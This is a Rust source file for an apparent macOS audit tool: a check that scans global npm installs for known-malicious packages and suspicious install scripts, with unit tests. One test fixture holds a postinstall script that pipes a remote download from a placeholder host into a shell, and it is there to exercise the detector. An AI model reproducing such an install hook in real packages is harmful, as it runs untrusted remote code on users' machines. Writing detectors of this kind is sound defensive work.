//! Supply chain check: are any of the globally installed npm packages known
//! to be malicious or suspicious-looking?
//!
//! To stay fast on every audit it only looks at the global install
//! directories and the `npx` cache. The detailed scan that also covers
//! projects' `node_modules` directories is in `--npm` mode; the actual logic
//! lives in `crate::npm`.

use super::{Check, Outcome, Severity};
use crate::npm::{self, Finding};
use crate::runner::CommandRunner;

pub struct NpmPackages;

impl Check for NpmPackages {
    fn id(&self) -> &'static str {
        "npm-packages"
    }
    fn name(&self) -> &'static str {
        "Malicious npm packages"
    }
    fn weight(&self) -> u32 {
        15
    }
    fn severity(&self) -> Severity {
        Severity::Critical
    }

    fn run(&self, runner: &dyn CommandRunner) -> Outcome {
        let roots = npm::global_roots(runner);
        if roots.is_empty() {
            return Outcome::pass("No global npm install directory found; no packages to scan.");
        }
        outcome(&npm::scan(&roots))
    }
}

/// Converts the scan result into a check outcome.
fn outcome(scan: &npm::Scan) -> Outcome {
    let malware: Vec<String> = scan.malware().map(describe).collect();
    if !malware.is_empty() {
        return Outcome::fail(
            format!("Malicious packages: {}.", malware.join(", ")),
            "Remove the package and rotate your keys and passwords; scan with `--npm` for details.",
        );
    }

    let suspicious: Vec<String> = scan.suspicious().map(describe).collect();
    if !suspicious.is_empty() {
        return Outcome::warn(
            format!("Suspicious install scripts: {}.", suspicious.join(", ")),
            "Review the script; scan with `--npm` for details and project directories.",
        );
    }

    Outcome::pass(format!(
        "{} global directories, {} packages inspected; no malware found.",
        scan.roots.len(),
        scan.packages
    ))
}

fn describe(finding: &Finding) -> String {
    format!("{}@{} ({})", finding.package, finding.version, finding.reason)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::Status;
    use std::path::PathBuf;

    /// Sets up a temporary `node_modules` and scans it.
    fn scan_fixture(label: &str, manifest: serde_json::Value) -> npm::Scan {
        let root: PathBuf = std::env::temp_dir()
            .join(format!("macos-audit-supply-{label}-{}", std::process::id()));
        let package = root.join("node_modules/pkg");
        std::fs::create_dir_all(&package).unwrap();
        std::fs::write(package.join("package.json"), manifest.to_string()).unwrap();

        let scan = npm::scan(&[root.join("node_modules")]);
        std::fs::remove_dir_all(&root).unwrap();
        scan
    }

    #[test]
    fn clean_packages_pass() {
        let scan = scan_fixture("clean", serde_json::json!({ "name": "express", "version": "4.18.2" }));
        let outcome = outcome(&scan);
        assert_eq!(outcome.status, Status::Pass);
        assert!(outcome.detail.contains("1 packages"));
    }

    #[test]
    fn known_malicious_version_fails() {
        let scan = scan_fixture("known", serde_json::json!({ "name": "chalk", "version": "5.6.1" }));
        let outcome = outcome(&scan);
        assert_eq!(outcome.status, Status::Fail);
        assert!(outcome.detail.contains("chalk@5.6.1"));
    }

    #[test]
    fn suspicious_script_warns() {
        let scan = scan_fixture(
            "script",
            serde_json::json!({
                "name": "pkg",
                "version": "1.0.0",
                "scripts": { "postinstall": "curl -s https://example.com/x | sh" },
            }),
        );
        assert_eq!(outcome(&scan).status, Status::Warn);
    }
}
